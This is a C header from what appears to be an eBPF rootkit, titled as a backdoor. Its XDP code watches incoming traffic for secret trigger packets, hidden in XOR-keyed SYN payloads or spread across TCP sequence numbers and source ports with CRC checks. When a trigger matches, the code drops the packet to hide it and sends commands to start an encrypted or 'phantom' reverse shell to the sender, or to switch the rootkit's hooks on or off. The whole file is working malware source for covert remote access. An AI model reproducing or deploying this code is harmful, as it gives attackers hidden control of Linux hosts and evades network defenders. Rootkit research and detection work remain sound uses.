#ifndef __BPF_BACKDOOR
#define __BPF_BACKDOOR

#include "headervmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../data/ring_buffer.h"
#include "../../../common/c&c.h"
#include "../bpf/defs.h"

static __always_inline int execute_key_command(int command_received, __u32 ip, __u16 port){
    int pid = -1; //Received by network stack, just ignore
    switch(command_received){
        case CC_PROT_COMMAND_ENCRYPTED_SHELL:
            bpf_printk("Received request to start encrypted connection\n");
            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
            break;
        case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
            bpf_printk("Received request to activate all hooks\n");
            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
            break;
        case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
            bpf_printk("Received request to deactivate all hooks\n");
            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
            break;
        case CC_PROT_COMMAND_PHANTOM_SHELL:
            bpf_printk("Received request to start phantom shell\n");
            //Check for phantom shell state
            __u64 key = 1;
            struct backdoor_phantom_shell_data *ps_data = (struct backdoor_phantom_shell_data*) bpf_map_lookup_elem(&backdoor_phantom_shell, &key);
            if(ps_data != (void*)0 && ps_data->active ==1){
                bpf_printk("Overwriting previous phantom shell config\n");
            }
            struct backdoor_phantom_shell_data ps_new_data = {0};
            ps_new_data.active = 1;
            ps_new_data.d_ip  = ip;
            ps_new_data.d_port = port;    
            __builtin_memcpy(ps_new_data.payload, CC_PROT_PHANTOM_SHELL_INIT, 16);
            ring_buffer_send_request_update_phantom_shell(&rb_comm, pid, command_received, ps_new_data);
            break;
            
        default:
            bpf_printk("Command received unknown: %d\n", command_received);
    }

    return 0;
}


static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 payload_size, __u32 s_ip, __u16 s_port){
    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN]; 
    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result1[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];

    //Undoing the trigger secret packet to check it is the one expected

    //Loading keys
    __builtin_memcpy(key1, CC_TRIGGER_SYN_PACKET_KEY_1, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(key2, CC_TRIGGER_SYN_PACKET_KEY_2, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    //S1 XOR K1
    __builtin_memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result1[ii] = section[ii] ^ section2[ii];
        if(result1[ii]!=key1[ii]){
            bpf_printk("FAIL CHECK 1\n");
            return XDP_PASS;
        }
    }

    //S2 XOR K2
    __builtin_memcpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result2[ii] = section[ii] ^ section2[ii];
        if(result2[ii]!=key2[ii]){
            bpf_printk("FAIL CHECK 2\n");
            return XDP_PASS;
        }
    }

    //S1 XOR K1 XOR S2 XOR K2 XOR (K3+COMMAND VALUE)
    __builtin_memcpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section3, payload+0x0C, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    int correct = 1;
    int command_received = -1;

    //Checking for a valid K3, which indicates the command sent by the backdoor client
    //Not the cleanest code, needs refactoring
    //Encrypted shell request
    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
        if(result3[ii]!=(key3[ii])){
            correct = 0;
        }
    }
    if(correct == 1){
        //Found valid k3 value
        command_received = CC_PROT_COMMAND_ENCRYPTED_SHELL;
        goto backdoor_finish;
    }

    correct = 1;
    //Hook activate all request
    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_ACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
        if(result3[ii]!=(key3[ii])){
            correct = 0;
        }
    }
    if(correct == 1){
        //Found valid k3 value
        command_received = CC_PROT_COMMAND_HOOK_ACTIVATE_ALL;
        goto backdoor_finish;
    }

    correct = 1;
    //Hook deactivate all request
    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_DEACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
        if(result3[ii]!=(key3[ii])){
            correct = 0;
        }
    }
    if(correct == 1){
        //Found valid k3 value
        command_received = CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL;
        goto backdoor_finish;
    }

    correct = 1;
    //Phantom shell request
    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_PHANTOM_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
        if(result3[ii]!=(key3[ii])){
            correct = 0;
        }
    }
    if(correct == 1){
        //Found valid k3 value
        command_received = CC_PROT_COMMAND_PHANTOM_SHELL;
        goto backdoor_finish;
    }
    

backdoor_finish:
    //Found no valid key 3
    if(correct==0){
        bpf_printk("FAIL CHECK 3\n");
        return XDP_PASS;
    }

    //If we reach this point then we received trigger packet
    bpf_printk("Finished backdoor V1 check with success\n");
    __u32 ip = s_ip;
    __u16 port = s_port;

    execute_key_command(command_received, ip, port);


    return XDP_DROP; 
}


/**
 * @brief Operates the V3 backdoor, and opens an encrypted shell if succeeds
 *Returns 1 if it wants to close to discard the ongoing packet.
 * 
 * @param b_data 
 * @return __always_inline 
 */
static __always_inline int manage_backdoor_trigger_v3_32(struct backdoor_packet_log_data_32 b_data){
    int last_received = b_data.last_packet_modified;
    int first_packet;
    if(last_received>=0&&last_received<2){
        first_packet = last_received+1;
    }else{
        first_packet = 0;
    } 

    //The following routine (not just the next check) is necessarily dirty in terms of programming,
    //but the ebpf verifier strongly dislikes MOD operations (check report, screenshot)
    char payload[CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM] = {0};
    if(first_packet == 0){
        for(int ii=first_packet; ii<3; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
        }
    }else if(first_packet == 1){
        for(int ii=first_packet; ii<3; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
        }
    }else if(first_packet == 2){
        for(int ii=first_packet; ii<3; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
        }
    }
    
    /*bpf_printk("Payload before XOR: ");
    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM; ii++){
        bpf_printk("%x", payload[ii]);
    }
    bpf_printk("\n");*/

    //Now that we have the possible complete stream, let's search for the secret backdoor combination in it
    //First undo running XOR
    for(int ii=CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM-1; ii>0; ii--){
        char xor_res = payload[ii-1] ^ payload[ii];
        __builtin_memcpy(payload+ii, (char*)&(xor_res), 0x01);
    }

    /*bpf_printk("Payload after XOR: ");
    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM; ii++){
        bpf_printk("%x", payload[ii]);
    }
    bpf_printk("\n");*/

    //Now compute CRC
    __u8 x;
    __u16 crc = 0xFFFF;
    __u8 length = 0x0A;
    char *payload_p = payload;

    while (length--){
        x = crc >> 8 ^ *payload_p++;
        x ^= x>>4;
        crc = (crc << 8) ^ ((__u16)(x << 12)) ^ ((__u16)(x <<5)) ^ ((__u16)x);
    }

    //Check CRC with the one received
    char crc_char1, crc_char2;
    __builtin_memcpy(&crc_char1, (char*)&(crc), sizeof(__u8));
    __builtin_memcpy(&crc_char2, (char*)&(crc)+1, sizeof(__u8));
    if(crc_char1 != payload[0x0A]){
        bpf_printk("Failed backdoor V3 (32bit) check 1: %x vs %x\n", crc_char1, payload[0x0A]);
        return 0;
    }
    if(crc_char2 != payload[0x0B]){
        bpf_printk("Failed backdoor V3  (32bit) check 2: %x vs %x\n", crc_char2, payload[0x0B]);
        return 0;
    }

    //Check the K3 used, that indicates the command issued, and whether it was a valid payload too
    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1];
    int correct = 1;
    int command_received = -1;
    //Encrypted shell request
    __builtin_memcpy(key3, CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = payload[0x05+ii] ^ payload[0x08+ii];
        if(result[ii]!=(key3[ii])){
            bpf_printk("R: %x, K3:%x", result[ii], key3[ii]);
            bpf_printk("P5:%x, P8:%x\n", payload[0x05+ii], payload[0x08+ii]);
            correct = 0;
        }
    }
    if(correct == 1){
        //Found valid k3 value
        command_received = CC_PROT_COMMAND_ENCRYPTED_SHELL;
        goto backdoor_finish_v3_32;
    }

backdoor_finish_v3_32:
    //Found no valid key 3
    if(correct==0){
        bpf_printk("FAIL CHECK 3\n");
        return 0;
    }
    bpf_printk("Completed backdoor trigger v3 (32bit), b_data position: %i\n", b_data.last_packet_modified);
    execute_key_command(command_received, 0, 0);

    return 1;
}

static __always_inline int manage_backdoor_trigger_v3_16(struct backdoor_packet_log_data_16 b_data){
    int last_received = b_data.last_packet_modified;
    int first_packet;
    if(last_received>=0&&last_received<5){
        first_packet = last_received+1;
    }else{
        first_packet = 0;
    } 

    //The following routine is necessarily dirty in terms of programming,
    //but the ebpf verifier strongly dislikes MOD operations (check report, screenshot)
    char payload[CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT] = {0};
    if(first_packet == 0){
        for(int ii=first_packet; ii<6; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
    }else if(first_packet == 1){
        for(int ii=first_packet; ii<6; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
    }else if(first_packet == 2){
        for(int ii=first_packet; ii<6; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
    }else if(first_packet == 3){
        for(int ii=first_packet; ii<6; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
    }else if(first_packet == 4){
        for(int ii=first_packet; ii<6; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
    }else if(first_packet == 5){
        for(int ii=first_packet; ii<6; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u16 src_port = b_data.trigger_array[ii].src_port;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
        }
    }
    
    /*bpf_printk("Payload before XOR: ");
    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT; ii++){
        bpf_printk("%x", payload[ii]);
    }
    bpf_printk("\n");*/

    //Now that we have the possible complete stream, let's search for the secret backdoor combination in it
    //First undo running XOR
    for(int ii=CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT-1; ii>0; ii--){
        char xor_res = payload[ii-1] ^ payload[ii];
        __builtin_memcpy(payload+ii, (char*)&(xor_res), 0x01);
    }

    /*bpf_printk("Payload after XOR: ");
    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT; ii++){
        bpf_printk("%x", payload[ii]);
    }
    bpf_printk("\n");*/

    //Now compute CRC
    __u8 x;
    __u16 crc = 0xFFFF;
    __u8 length = 0x0A;
    char *payload_p = payload;

    while (length--){
        x = crc >> 8 ^ *payload_p++;
        x ^= x>>4;
        crc = (crc << 8) ^ ((__u16)(x << 12)) ^ ((__u16)(x <<5)) ^ ((__u16)x);
    }

    //Check CRC with the one received
    char crc_char1, crc_char2;
    __builtin_memcpy(&crc_char1, (char*)&(crc), sizeof(__u8));
    __builtin_memcpy(&crc_char2, (char*)&(crc)+1, sizeof(__u8));
    if(crc_char1 != payload[0x0A]){
        bpf_printk("Failed backdoor V3 (16bit) check 1 in %i: %x vs %x\n", last_received, crc_char1, payload[0x0A]);
        return 0;
    }
    if(crc_char2 != payload[0x0B]){
        bpf_printk("Failed backdoor V3 (16bit) check 2: %x vs %x\n", crc_char2, payload[0x0B]);
        return 0;
    }

    //Check the K3 used, that indicates the command issued, and whether it was a valid payload too
    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1];
    int correct = 1;
    int command_received = -1;
    //Encrypted shell request
    __builtin_memcpy(key3, CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = payload[0x05+ii] ^ payload[0x08+ii];
        if(result[ii]!=(key3[ii])){
            bpf_printk("R: %x, K3:%x", result[ii], key3[ii]);
            bpf_printk("P5:%x, P8:%x\n", payload[0x05+ii], payload[0x08+ii]);
            correct = 0;
        }
    }
    if(correct == 1){
        //Found valid k3 value
        command_received = CC_PROT_COMMAND_ENCRYPTED_SHELL;
        goto backdoor_finish_v3_16;
    }

backdoor_finish_v3_16:
    //Found no valid key 3
    if(correct==0){
        bpf_printk("FAIL CHECK 3\n");
        return 0;
    }
    bpf_printk("Completed backdoor trigger v3 (16bit), b_data position: %i\n", b_data.last_packet_modified);
    execute_key_command(command_received, 0, 0);

    return 1;
}

#endif